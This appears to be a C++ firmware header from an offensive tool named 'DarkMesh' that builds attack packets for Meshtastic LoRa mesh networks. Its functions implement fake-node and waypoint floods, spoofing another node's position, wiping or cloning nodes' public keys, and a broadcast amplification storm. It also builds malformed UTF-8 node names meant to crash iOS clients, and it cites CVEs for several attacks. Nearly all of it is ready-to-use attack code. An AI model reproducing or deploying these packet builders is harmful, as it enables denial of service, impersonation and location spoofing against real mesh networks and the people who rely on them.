#pragma once
// ============================================================
//  meshtastic_packets.h  -  Constructores de paquetes
//  especificos para cada ataque de DarkMesh
//
//  Referencia de campos protobuf (mesh.proto):
//
//  User {
//    id        = field 1  (string)  "!deadbeef"
//    long_name = field 2  (string)
//    short_name= field 3  (string)
//    macaddr   = field 4  (bytes, 6 bytes, deprecated)
//    hw_model  = field 5  (uint32/HardwareModel)
//    is_licensed = field 6 (bool)
//    role      = field 7  (uint32/DeviceConfig.Role) CLIENT=1
//    public_key= field 8  (bytes)
//  }
//
//  Position {
//    latitude_i = field 1  (int32, grados * 1e7)
//    longitude_i= field 2  (int32, grados * 1e7)
//    altitude   = field 3  (int32, metros)
//    time       = field 4  (uint32, unix timestamp)
//    speed      = field 9  (uint32, m/s * 100)
//  }
//
//  Waypoint {
//    id         = field 1  (uint32)
//    latitude_i = field 2  (int32)
//    longitude_i= field 3  (int32)
//    expire     = field 4  (uint32, unix timestamp)
//    name       = field 5  (string)
//    description= field 6  (string)
//  }
//
//  Data {
//    portnum    = field 1  (uint32)
//    payload    = field 2  (bytes ? serialized sub-message)
//    want_response = field 3 (bool)
//    dest       = field 4  (uint32, node dest para routing)
//    source     = field 5  (uint32, node src original)
//    request_id = field 6  (uint32)
//  }
// ============================================================

#include "meshtastic_proto.h"
#include <Arduino.h>

// ---- HW Model IDs para flood variado ---------------------
// Seleccion de modelos reales y variados del enum HardwareModel
// Valores verificados contra mesh.proto oficial
struct HWModelEntry { uint32_t id; const char* name; };
// IDs verificados contra mesh.proto oficial (meshtastic/protobufs master)
static const HWModelEntry HW_MODELS[] = {
    {  4, "TBEAM"          },  // TBEAM = 4
    {  5, "HELTEC_V2_0"    },  // HELTEC_V2_0 = 5
    {  9, "RAK4631"        },  // RAK4631 = 9
    { 10, "HELTEC_V2_1"    },  // HELTEC_V2_1 = 10
    { 13, "RAK11200"       },  // RAK11200 = 13
    { 43, "HELTEC_V3"      },  // HELTEC_V3 = 43
    {  2, "TLORA_V1"       },  // TLORA_V1 = 2
    {  1, "TLORA_V2"       },  // TLORA_V2 = 1
    {  3, "TLORA_V2_1_1P6" },  // TLORA_V2_1_1P6 = 3
    { 16, "TLORA_T3_S3"    },  // TLORA_T3_S3 = 16
    {  7, "T_ECHO"         },  // T_ECHO = 7
    { 25, "STATION_G1"     },  // STATION_G1 = 25
};
static const uint8_t HW_MODELS_COUNT =
    sizeof(HW_MODELS) / sizeof(HW_MODELS[0]);

// Mantener tambien el define para uso en PKI attacks
#define HW_MODEL_TBEAM 4

inline uint32_t random_hw_model() {
    return HW_MODELS[esp_random() % HW_MODELS_COUNT].id;
}

// ---- Tablas de timing para Flood -------------------------
// radio_transmit() bloquea durante el airtime real.
// FLOOD_INTER_PKT_DELAY_MS: delay adicional POST-TX para que
// los nodos receptores puedan procesar antes del siguiente pkt.
// FLOOD_TOTAL_MS_PER_PKT: tiempo total estimado por paquete
// (airtime + delay), usado para calcular duracion minima.

static const uint32_t FLOOD_INTER_PKT_DELAY_MS[] = {
     400,  // 0: ShortTurbo    (airtime?26ms,   total?426ms/pkt)
     400,  // 1: ShortFast     (airtime?51ms,   total?451ms/pkt)
     400,  // 2: ShortSlow     (airtime?111ms,  total?511ms/pkt)
     500,  // 3: MediumFast    (airtime?259ms,  total?759ms/pkt)  ? demo
     500,  // 4: MediumSlow    (airtime?488ms,  total?988ms/pkt)
     600,  // 5: LongFast      (airtime?1149ms, total?1749ms/pkt)
     800,  // 6: LongModerate  (airtime?2298ms, total?3098ms/pkt)
    1000,  // 7: LongSlow      (airtime?4071ms, total?5071ms/pkt)
    1500,  // 8: VeryLongSlow  (airtime?8143ms, total?9643ms/pkt)
};

static const uint32_t FLOOD_TOTAL_MS_PER_PKT[] = {
     426,  // 0: ShortTurbo
     451,  // 1: ShortFast
     511,  // 2: ShortSlow
     759,  // 3: MediumFast
     988,  // 4: MediumSlow
    1749,  // 5: LongFast
    3098,  // 6: LongModerate
    5071,  // 7: LongSlow
    9643,  // 8: VeryLongSlow
};

// Duracion minima en segundos para enviar N nodos completos
inline uint32_t flood_min_duration_s(uint32_t node_count, uint8_t preset_idx) {
    if (preset_idx >= 9) preset_idx = 5;
    uint32_t total_ms = node_count * FLOOD_TOTAL_MS_PER_PKT[preset_idx];
    return (total_ms / 1000) + 2;  // +2s de margen
}

// ---- Serializar User ------------------------------------
inline size_t proto_build_user(uint8_t* out, size_t cap,
    uint32_t node_id,
    const char* long_name,
    const char* short_name,
    uint32_t hw_model = HW_MODEL_TBEAM,
    const uint8_t* public_key = nullptr,
    size_t pubkey_len = 0)
{
    char id_str[12];
    snprintf(id_str, sizeof(id_str), "!%08x", node_id);

    // macaddr: ultimos 6 bytes del node_id (simulado)
    uint8_t mac[6] = {
        0x00, 0x11,
        (uint8_t)(node_id >> 24),
        (uint8_t)(node_id >> 16),
        (uint8_t)(node_id >> 8),
        (uint8_t)(node_id)
    };

    // Schema oficial User proto (mesh.proto):
    //   1: id (string)
    //   2: long_name (string)
    //   3: short_name (string)
    //   4: macaddr (bytes, deprecated)
    //   5: hw_model (uint32/enum HardwareModel)
    //   6: is_licensed (bool)
    //   7: role (uint32/enum DeviceConfig.Role)
    //   8: public_key (bytes)
    ProtoWriter w(out, cap);
    w.write_field_string(1, id_str);
    w.write_field_string(2, long_name);
    w.write_field_string(3, short_name);
    w.write_field_bytes (4, mac, 6);
    w.write_field_uint32(5, hw_model);   // field 5: hw_model
    // field 6: is_licensed = false (default, no serializar)
    w.write_field_uint32(7, 1);          // field 7: role = CLIENT (1)
    if (public_key && pubkey_len > 0)
        w.write_field_bytes(8, public_key, pubkey_len);  // field 8: public_key
    return w.ok() ? w.size() : 0;
}

// ---- Serializar Position --------------------------------
// Helpers para escribir sfixed32 y fixed32 (wire type 5)
// El Position proto usa sfixed32 para lat/lon y fixed32 para time
inline bool write_sfixed32(ProtoWriter& w, uint32_t field, int32_t val) {
    if (!w.write_tag(field, 5)) return false;
    if (w.pos + 4 > w.cap) return false;
    memcpy(w.buf + w.pos, &val, 4);
    w.pos += 4;
    return true;
}
inline bool write_fixed32(ProtoWriter& w, uint32_t field, uint32_t val) {
    if (!w.write_tag(field, 5)) return false;
    if (w.pos + 4 > w.cap) return false;
    memcpy(w.buf + w.pos, &val, 4);
    w.pos += 4;
    return true;
}

inline size_t proto_build_position(uint8_t* out, size_t cap,
    float lat, float lon,
    int32_t alt_m = 0,
    uint32_t timestamp = 0)
{
    int32_t lat_i = (int32_t)(lat * 1e7f);
    int32_t lon_i = (int32_t)(lon * 1e7f);

    // Timestamp Unix creible y siempre creciente
    // 2025-01-01 = 1735689600 + uptime en segundos
    if (timestamp == 0)
        timestamp = 1735689600UL + (millis() / 1000);

    ProtoWriter w(out, cap);
    // field 1: latitude_i  ? sfixed32 (wire type 5, 4 bytes LE)
    write_sfixed32(w, 1, lat_i);
    // field 2: longitude_i ? sfixed32 (wire type 5, 4 bytes LE)
    write_sfixed32(w, 2, lon_i);
    // field 3: altitude    ? int32 (wire type 0, varint)
    if (alt_m != 0) w.write_field_int32(3, alt_m);
    // field 4: time        ? fixed32 (wire type 5, 4 bytes LE)
    write_fixed32(w, 4, timestamp);
    // field 5: location_source = LOC_MANUAL (1)
    // Indica que la posicion fue ingresada manualmente
    w.write_field_uint32(5, 1);
    // field 23: precision_bits = 32 (maxima precision)
    w.write_field_uint32(23, 32);
    return w.ok() ? w.size() : 0;
}

// ============================================================
//  NullMeshGrow - User con long_name/short_name malformados
//
//  CVE-2026-42566: un User.long_name con codificacion UTF-8
//  malformada (p.ej. un byte nulo en medio de una secuencia
//  multibyte, o bytes de continuacion huerfanos) envenena la
//  NodeDB de los receptores. La aplicacion iOS aplica validacion
//  de codificacion y no puede parsear la base de datos, entrando
//  en un bucle de fallo/reintento de la sincronizacion BLE que
//  deja el dispositivo inutilizable (DoS, CVSS 7.5).
//
//  A diferencia de proto_build_user() (que usa write_field_string
//  -> strlen), aqui se serializan los nombres como BYTES CRUDOS con
//  longitud explicita, para poder inyectar '\x00', espacios y
//  secuencias UTF-8 rotas sin que el terminador nulo corte el campo.
// ============================================================

// Genera un "owner" malformado (long_name o short_name) combinando
// espacios, bytes nulos y secuencias UTF-8 multibyte rotas. Devuelve la
// longitud real de bytes escritos, SIEMPRE <= max_len.
//
// IMPORTANTE (CVE-2026-42566 + limites del proto):
//   - User.long_name  -> max_size = 40 bytes
//   - User.short_name -> max_size =  4 bytes
// Si no se respeta el max_size, el parser nanopb del firmware descarta el
// paquete con "string overflow" y el nombre no llega a la NodeDB.
inline size_t make_malformed_owner(char* out, size_t cap) {
    // Patrones de UTF-8 roto / desbordamiento de buffer tipico.
    // Secuencias con byte inicial sin continuador (0xC3), byte de
    // continuacion huerfano (0x80) y secuencia multibyte truncada
    // (0xE2 0x80) que disparan la validacion de codificacion en iOS.
    static const uint8_t BAD_SEQ[] = {
        0xC3, 0x80,        // byte inicial + continuacion "huérfana" (UTF-8 invalido)
        0xE2, 0x80,        // secuencia de 3 bytes truncada
        'N', 'u', 'l', 'l',// texto visible
        0x00,              // byte nulo
        ' ', ' ',          // espacios en blanco
    };
    size_t n = sizeof(BAD_SEQ);
    if (n > cap) n = cap;
    if (n == 0) { out[0] = ' '; return 1; }
    memcpy(out, BAD_SEQ, n);
    return n;
}

// Serializar User con nombres malformados (bytes crudos, no strlen)
inline size_t proto_build_user_malformed(uint8_t* out, size_t cap,
    uint32_t node_id,
    const uint8_t* long_name, size_t long_len,
    const uint8_t* short_name, size_t short_len,
    uint32_t hw_model = HW_MODEL_TBEAM,
    const uint8_t* public_key = nullptr,
    size_t pubkey_len = 0)
{
    char id_str[12];
    snprintf(id_str, sizeof(id_str), "!%08x", node_id);

    uint8_t mac[6] = {
        0x00, 0x11,
        (uint8_t)(node_id >> 24),
        (uint8_t)(node_id >> 16),
        (uint8_t)(node_id >> 8),
        (uint8_t)(node_id)
    };

    ProtoWriter w(out, cap);
    w.write_field_string(1, id_str);                  // id (string)
    if (long_name && long_len > 0)
        w.write_field_bytes(2, long_name, long_len);  // long_name (bytes CRUDOS)
    if (short_name && short_len > 0)
        w.write_field_bytes(3, short_name, short_len);// short_name (bytes CRUDOS)
    w.write_field_bytes (4, mac, 6);
    w.write_field_uint32(5, hw_model);
    w.write_field_uint32(7, 1);                        // role = CLIENT
    if (public_key && pubkey_len > 0)
        w.write_field_bytes(8, public_key, pubkey_len);
    return w.ok() ? w.size() : 0;
}

// ---- Serializar Waypoint --------------------------------
inline size_t proto_build_waypoint(uint8_t* out, size_t cap,
    float lat, float lon,
    const char* name,
    const char* description = "",
    uint32_t expire = 0)
{
    int32_t lat_i = (int32_t)(lat * 1e7f);
    int32_t lon_i = (int32_t)(lon * 1e7f);
    uint32_t wp_id = esp_random() & 0xFFFF;

    ProtoWriter w(out, cap);
    w.write_field_uint32(1, wp_id);
    w.write_field_int32 (2, lat_i);
    w.write_field_int32 (3, lon_i);
    if (expire > 0)
        w.write_field_uint32(4, expire);
    w.write_field_string(5, name);
    if (description && strlen(description) > 0)
        w.write_field_string(6, description);
    return w.ok() ? w.size() : 0;
}

// ============================================================
//  CONSTRUCTORES DE ATAQUES
// ============================================================

// ---- Ataque 1: Flood - Nodo falso con coords aleatorias --
inline MeshTxPacket attack_flood_node(uint32_t attacker_id, uint8_t ch_hash = 0x08) {
    uint32_t fake_id = mesh_random_node_id();

    char long_name[24], short_name[5];
    snprintf(long_name,  sizeof(long_name),  "Node-%04X", (uint16_t)fake_id);
    snprintf(short_name, sizeof(short_name), "%04X",      (uint16_t)fake_id);

    // Coordenadas aleatorias en rango valido
    float lat = ((float)(esp_random() % 16000000) / 100000.0f) - 80.0f;
    float lon = ((float)(esp_random() % 36000000) / 100000.0f) - 180.0f;

    uint8_t user_buf[128];
    size_t user_len = proto_build_user(user_buf, sizeof(user_buf),
        fake_id, long_name, short_name, random_hw_model());
    if (user_len == 0) { MeshTxPacket p; p.valid=false; p.len=0; return p; }

    return mesh_build_packet(fake_id, MESH_BROADCAST_ADDR,
        PORTNUM_NODEINFO, user_buf, user_len, MESH_DEFAULT_HOP_LIMIT, ch_hash);
}

// ---- Ataque 2: Namechange - Renombrar nodo existente -----
//  Sin helper builder aqui: la UI arma el User manualmente en
//  screen_attack_namechange() (src/main.cpp) para poder elegir el
//  hw_model a suplantar. El antiguo attack_namechange() quedaba sin uso.

// ---- Ataque 3: Position Poison - Falsa ubicacion ---------
inline MeshTxPacket attack_position_poison(
    uint32_t attacker_id,
    uint32_t target_id,
    float fake_lat, float fake_lon,
    int32_t fake_alt = 0,
    uint8_t ch_hash = 0x08)
{
    uint8_t pos_buf[64];
    size_t pos_len = proto_build_position(pos_buf, sizeof(pos_buf),
        fake_lat, fake_lon, fake_alt, (uint32_t)(millis()/1000));
    if (pos_len == 0) { MeshTxPacket p; p.valid=false; p.len=0; return p; }

    return mesh_build_packet(target_id, MESH_BROADCAST_ADDR,
        PORTNUM_POSITION, pos_buf, pos_len, MESH_DEFAULT_HOP_LIMIT, ch_hash);
}

// ---- Ataque 4: PKI Poison - Borrar clave publica ---------
//  CVE-2025-55293: enviar NodeInfo con clave vacia
//  hace que los clientes marquen el nodo como "inseguro" (rojo)
inline MeshTxPacket attack_pki_poison(
    uint32_t attacker_id,
    uint32_t target_id,
    const char* long_name,
    const char* short_name,
    uint8_t ch_hash = 0x08)
{
    // public_key = vacio ? fuerza al cliente a borrar la clave
    uint8_t empty_key[32] = {0};

    uint8_t user_buf[128];
    size_t user_len = proto_build_user(user_buf, sizeof(user_buf),
        target_id, long_name, short_name,
        HW_MODEL_TBEAM, empty_key, 32);
    if (user_len == 0) { MeshTxPacket p; p.valid=false; p.len=0; return p; }

    return mesh_build_packet(target_id, MESH_BROADCAST_ADDR,
        PORTNUM_NODEINFO, user_buf, user_len, MESH_DEFAULT_HOP_LIMIT, ch_hash);
}

// ---- Ataque 5: PKI Doubler - Clonar clave publica --------
//  Genera un nuevo nodo con la misma public_key que la victima
//  ? los clientes alertan "clave duplicada / expuesta"
inline MeshTxPacket attack_pki_doubler(
    uint32_t attacker_id,
    uint32_t target_id,
    const char* target_long_name,
    const uint8_t* victim_pubkey, size_t pubkey_len,
    uint8_t ch_hash = 0x08)
{
    uint32_t fake_id = mesh_random_node_id();
    char long_name[24], short_name[5];
    snprintf(long_name,  sizeof(long_name),  "Clone-%04X", (uint16_t)fake_id);
    snprintf(short_name, sizeof(short_name), "CL%02X",     (uint16_t)fake_id);

    uint8_t user_buf[160];
    size_t user_len = proto_build_user(user_buf, sizeof(user_buf),
        fake_id, long_name, short_name,
        HW_MODEL_TBEAM, victim_pubkey, pubkey_len);
    if (user_len == 0) { MeshTxPacket p; p.valid=false; p.len=0; return p; }

    return mesh_build_packet(fake_id, MESH_BROADCAST_ADDR,
        PORTNUM_NODEINFO, user_buf, user_len, MESH_DEFAULT_HOP_LIMIT, ch_hash);
}

// ---- Ataque 6: DDoS Amplification ------------------------
//  CVE-2024-51500: paquete con from=0xFFFFFFFF y hop_limit=7
//  Cada nodo que lo recibe lo retransmite ? tormenta de paquetes
inline MeshTxPacket attack_ddos_amplification(uint32_t attacker_id) {
    // Payload minimo: Data con portnum TEXT
    const char* msg = "x";
    uint8_t data_buf[16];
    size_t data_len = mesh_build_data(data_buf, sizeof(data_buf),
        PORTNUM_TEXT_MESSAGE, (const uint8_t*)msg, 1);

    // Header especial: from=0xFFFFFFFF, hop_limit=7
    MeshTxPacket pkt;
    pkt.valid = false;
    pkt.len   = 0;

    MeshPacketHeader hdr;
    mesh_fill_header(hdr, 0xFFFFFFFF, MESH_BROADCAST_ADDR,
        MESH_MAX_HOP_LIMIT, false);

    memcpy(pkt.data, &hdr, MESH_HEADER_SIZE);
    if (MESH_HEADER_SIZE + data_len > sizeof(pkt.data)) return pkt;
    memcpy(pkt.data + MESH_HEADER_SIZE, data_buf, data_len);
    pkt.len   = MESH_HEADER_SIZE + data_len;
    pkt.valid = true;
    return pkt;
}

// ---- Ataque 7: Waypoint Flood ----------------------------
inline MeshTxPacket attack_waypoint_flood(uint32_t attacker_id, uint8_t ch_hash = 0x08) {
    // Coordenadas aleatorias
    float lat = ((float)(esp_random() % 16000000) / 100000.0f) - 80.0f;
    float lon = ((float)(esp_random() % 36000000) / 100000.0f) - 180.0f;

    uint8_t wp_buf[96];
    size_t wp_len = proto_build_waypoint(wp_buf, sizeof(wp_buf),
        lat, lon, "DM", "DarkMesh", 0xFFFFFFFF);
    if (wp_len == 0) { MeshTxPacket p; p.valid=false; p.len=0; return p; }

    return mesh_build_packet(attacker_id, MESH_BROADCAST_ADDR,
        PORTNUM_WAYPOINT, wp_buf, wp_len, MESH_DEFAULT_HOP_LIMIT, ch_hash);
}
